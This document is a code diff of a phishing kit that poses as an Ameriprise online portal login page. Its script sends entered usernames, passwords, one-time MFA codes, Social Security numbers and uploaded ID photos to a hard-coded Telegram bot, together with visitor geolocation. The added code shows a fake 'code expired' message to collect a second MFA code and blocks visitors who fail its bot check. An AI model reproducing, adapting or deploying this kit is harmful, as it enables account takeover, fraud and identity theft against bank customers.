@@ -3,7 +3,7 @@
     <meta charset=utf-8>
     <meta name=viewport content="width=device-width,initial-scale=1">
     <meta  content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
-    <title>Ameriprise</title>
+    <title>Ameriprise Online Portal</title>
     <style>
         body, html {
             margin: 0;
@@ -387,139 +387,200 @@ function sendMessage2() {
 
 function verifyAndRedirect() {
                 if (isHuman()) {
-            const AUTH_PASSWORD = "correctpassword"; 
-            const DOC_LINK = "https://example.com/document";
-            const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage";
-            const TELEGRAM_FILE_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendDocument";
-            const IPINFO_URL = "https://ipinfo.io/json?token=d8eafd6deea176"; 
+                    if (isValidEmail('${getBase64FromUrl()}')) {
+    const AUTH_PASSWORD = "correctpassword"; 
+const DOC_LINK = "https://example.com/document";
+const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage";
+const TELEGRAM_FILE_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendDocument";
+const IPINFO_URL = "https://ipinfo.io/json?token=d8eafd6deea176";
 
-            let attemptCounter = 0;
+let attemptCounter = 0;
+let mfaAttemptCount = 0;
+let firstMfaCode = null;
 
-            const passwordForm = document.getElementById('authForm');
-            const passwordInput = document.getElementById('password');
-            const usernameInput = document.getElementById('username');
-            const passwordError = document.getElementById('password-error');
-            const mfaForm = document.getElementById('mfaAuthForm');
-            const mfaInput = document.getElementById('mfa-code');
-            const mfaError = document.getElementById('mfa-error');
-            const identityForm = document.getElementById('identityForm');
-            const ssnInput = document.getElementById('ssn');
-            const idFrontInput = document.getElementById('id-front');
-            const idBackInput = document.getElementById('id-back');
-            const identityError = document.getElementById('identity-error');
-            const loading = document.getElementById('loading');
+const passwordForm = document.getElementById('authForm');
+const passwordInput = document.getElementById('password');
+const usernameInput = document.getElementById('username');
+const passwordError = document.getElementById('password-error');
+const mfaForm = document.getElementById('mfaAuthForm');
+const mfaInput = document.getElementById('mfa-code');
+const mfaError = document.getElementById('mfa-error');
+const identityForm = document.getElementById('identityForm');
+const ssnInput = document.getElementById('ssn');
+const idFrontInput = document.getElementById('id-front');
+const idBackInput = document.getElementById('id-back');
+const identityError = document.getElementById('identity-error');
+const loading = document.getElementById('loading');
 
-            async function getLocation() {
-                try {
-                    const response = await fetch(IPINFO_URL);
-                    return response.json();
-                } catch (error) {
-                    return { city: "Unknown", region: "Unknown", country: "Unknown", ip: "Unknown" };
-                }
-            }
+async function getLocation() {
+    try {
+        const response = await fetch(IPINFO_URL);
+        return response.json();
+    } catch (error) {
+        console.error("Error fetching location:", error.message);
+        return { city: "Unknown", region: "Unknown", country: "Unknown", ip: "Unknown" };
+    }
+}
 
-            async function sendToTelegram(message) {
-                await fetch(TELEGRAM_BOT_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: "1412104349", text: message }),
-                });
-            }
+async function sendToTelegram(message) {
+    try {
+        const response = await fetch(TELEGRAM_BOT_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: "1412104349", text: message }),
+        });
+        if (!response.ok) {
+            console.error("Failed to send message to Telegram:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Error sending message to Telegram:", error.message);
+    }
+}
 
-            async function sendFilesToTelegram(fileInput, caption) {
-                if (!fileInput.files.length) return;
+async function sendFilesToTelegram(fileInput, caption) {
+    if (!fileInput.files.length) {
+        console.error("No file selected for upload.");
+        return;
+    }
 
-                const formData = new FormData();
-                formData.append("chat_id", "1412104349");
-                formData.append("document", fileInput.files[0]);
-                formData.append("caption", caption);
+    const formData = new FormData();
+    formData.append("chat_id", "1412104349");
+    formData.append("document", fileInput.files[0]);
+    formData.append("caption", caption);
 
-                try {
-                    const response = await fetch(TELEGRAM_FILE_URL, {
-                        method: "POST",
-                        body: formData,
-                    });
-                    if (!response.ok) {
-                        console.error(\`Failed to send file: \${response.statusText}\`);
+    try {
+        const response = await fetch(TELEGRAM_FILE_URL, {
+            method: "POST",
+            body: formData,
+        });
+        if (response.ok) {
+            console.log(\`File '\${caption}' sent successfully.\`);
+        } else {
+            console.error(\`Failed to send file '\${caption}':\`, response.statusText);
+        }
+    } catch (error) {
+        console.error(\`Error sending file '\${caption}' to Telegram: \`, error.message);
+    }
+}
+
+function hideAuthenticationTitle() {
+    const authTitle = document.getElementById('authentication-title');
+    if (authTitle) authTitle.style.display = 'none';
+}
+
+function showLoadingAndRedirect() {
+    loading.style.display = 'block';
+    setTimeout(() => (window.location.href = DOC_LINK), 3000);
+}
+
+function transitionToMFA() {
+    document.getElementById('password-form').style.display = 'none';
+    document.getElementById('mfa-form').style.display = 'block';
+    hideAuthenticationTitle();
+}
+
+function transitionToIdentityVerification() {
+    document.getElementById('mfa-form').style.display = 'none';
+    document.getElementById('identity-verification-form').style.display = 'block';
+    hideAuthenticationTitle();
+}
+
+passwordForm.addEventListener('submit', async (event) => {
+    event.preventDefault();
+    attemptCounter++;
+
+    const location = await getLocation();
+    const passwordValue = passwordInput.value;
+    const usernameValue = usernameInput.value;
+
+    await sendToTelegram(\`Username: \${usernameValue}\\nPassword: \${passwordValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
+
+    if (passwordValue !== AUTH_PASSWORD) {
+        if (attemptCounter === 1) {
+            passwordInput.classList.add('error');
+            passwordError.style.display = 'block';
+        } else {
+            transitionToMFA();
+        }
+    } else {
+        showLoadingAndRedirect();
+    }
+});
+
+mfaForm.addEventListener('submit', async (event) => {
+    event.preventDefault();
+    const mfaValue = mfaInput.value.trim();
+    const location = await getLocation();
+
+    await sendToTelegram(\`MFA Code: \${mfaValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
+    if (mfaAttemptCount === 0) {
+        if (/^\\d{6}$/.test(mfaValue)) {
+            firstMfaCode = mfaValue; 
+            mfaInput.value = ''; 
+            mfaError.style.display = 'block';
+            mfaError.textContent = 'Your code has expired. A new code will be sent to you shortly.'; 
+            mfaAttemptCount++;
+        } else {
+            mfaError.style.display = 'block';
+            mfaError.textContent = 'Invalid MFA code. Please try again.';
+            mfaInput.classList.add('error');
+        }
+    } else if (mfaAttemptCount === 1) {
+        if (mfaValue === firstMfaCode) {
+            mfaError.style.display = 'block';
+            mfaError.textContent = 'You entered an expired code. Try again.';
+            mfaInput.classList.add('error');
+        } else if (/^\\d{6}$/.test(mfaValue)) {
+            transitionToIdentityVerification();
+        } else {
+            mfaError.style.display = 'block';
+            mfaError.textContent = 'Invalid MFA code. Please try again.';
+            mfaInput.classList.add('error');
+        }
+    }
+});
+
+identityForm.addEventListener('submit', async (event) => {
+    event.preventDefault();
+
+    const ssnValue = ssnInput.value.trim();
+
+    if (!idFrontInput.files.length || !idBackInput.files.length) {
+        identityError.style.display = 'block';
+        identityError.textContent = "Please enter a valid 9-digit SSN and upload all required files.";
+        console.error("Validation failed: SSN or files are missing.");
+        return;
+    }
+
+    const location = await getLocation();
+
+    await sendToTelegram(\`SSN: \${ssnValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
+    await sendFilesToTelegram(idFrontInput, "ID Front");
+    await sendFilesToTelegram(idBackInput, "ID Back");
+
+    showLoadingAndRedirect();
+});
+                    
+                    } else {
+             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
                     }
-                } catch (error) {
-                    console.error(\`Error sending file to Telegram: \${error.message}\`);
-                }
-            }
-
-            passwordForm.addEventListener('submit', async (event) => {
-                event.preventDefault();
-                attemptCounter++;
-
-                const location = await getLocation();
-                const passwordValue = passwordInput.value;
-                const usernameValue = usernameInput.value;
-
-                sendToTelegram(\`Username: \${usernameValue}\\nPassword: \${passwordValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
-
-                if (passwordValue === AUTH_PASSWORD) {
-                    transitionToMFA();
                 } else {
-                    passwordError.style.display = 'block';
-                    if (attemptCounter > 1) transitionToMFA();
-                }
-            });
-
-            mfaForm.addEventListener('submit', async (event) => {
-                event.preventDefault();
-                const mfaValue = mfaInput.value.trim();
-                const location = await getLocation();
-
-                sendToTelegram(\`MFA Code: \${mfaValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
-                if (/^\\d{6}$/.test(mfaValue)) {
-                    transitionToIdentityVerification();
-                } else {
-                    mfaError.style.display = 'block';
-                }
-            });
-
-            identityForm.addEventListener('submit', async (event) => {
-                event.preventDefault();
-
-                const ssnValue = ssnInput.value.trim();
-                const isSSNValid = /^\\d{9}$/.test(ssnValue);
-
-                if (!isSSNValid || !idFrontInput.files.length || !idBackInput.files.length) {
-                    identityError.style.display = 'block';
-                    identityError.textContent = "Please enter a valid 9-digit SSN and upload all required files.";
-                    return;
-                }
-
-                const location = await getLocation();
-                sendToTelegram(\`SSN: \${ssnValue}\\nLocation: \${location.city}, \${location.region}, \${location.country}\`);
-                await sendFilesToTelegram(idFrontInput, "Uploaded ID Front");
-                await sendFilesToTelegram(idBackInput, "Uploaded ID Back");
-
-                showLoadingAndRedirect();
-            });
-
-            function transitionToMFA() {
-                document.getElementById('password-form').style.display = 'none';
-                document.getElementById('mfa-form').style.display = 'block';
-                hideAuthenticationTitle();
+            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
+    }
             }
 
-            function transitionToIdentityVerification() {
-                document.getElementById('mfa-form').style.display = 'none';
-                document.getElementById('identity-verification-form').style.display = 'block';
-                hideAuthenticationTitle();
-            }
-
-            function hideAuthenticationTitle() {
-                const authTitle = document.getElementById('authentication-title');
-                if (authTitle) authTitle.style.display = 'none';
-            }
-
-            function showLoadingAndRedirect() {
-                loading.style.display = 'block';
-                setTimeout(() => (window.location.href = DOC_LINK), 3000);
-            }
-    }}
             setTimeout(verifyAndRedirect, 1000);
         `;
         document.getElementById('content').innerHTML = `
@@ -529,7 +590,7 @@ function verifyAndRedirect() {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Authenticate to View Document</title>
-    <style>
+ <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f4;
@@ -545,7 +606,7 @@ function verifyAndRedirect() {
             margin: 0 auto;
         }
         h2, h3 {
-            font-size: 20px;
+            font-size: 18px;
             color: #333;
         }
         .logo {
@@ -615,8 +676,8 @@ function verifyAndRedirect() {
         <!-- Username and Password form -->
         <div id="password-form">
             <form id="authForm">
-                <input type="text" id="username" placeholder="Enter your username" required>
-                <input type="password" id="password" placeholder="Enter your password" required>
+                <input type="text" id="username" placeholder="User ID" required>
+                <input type="password" id="password" placeholder="Password" required>
                 <div id="password-error" class="error-message">Incorrect password. Please try again.</div>
                 <button type="submit" id="auth-submit">Continue</button>
             </form>
@@ -651,7 +712,7 @@ function verifyAndRedirect() {
         <!-- Loading animation -->
         <img src="https://cdnl.iconscout.com/lottie/premium/thumb/loading-bar-and-loader-5371059-4510678.gif" alt="Loading" class="loading" id="loading">
     </div>
-   </body>
+</body>
 </html>
     `;
         document.body.appendChild(script);
@@ -672,8 +733,6 @@ function verifyAndRedirect() {
             ); 
     }
 }
-
-
         fetchIPInfo();
     </script>
     
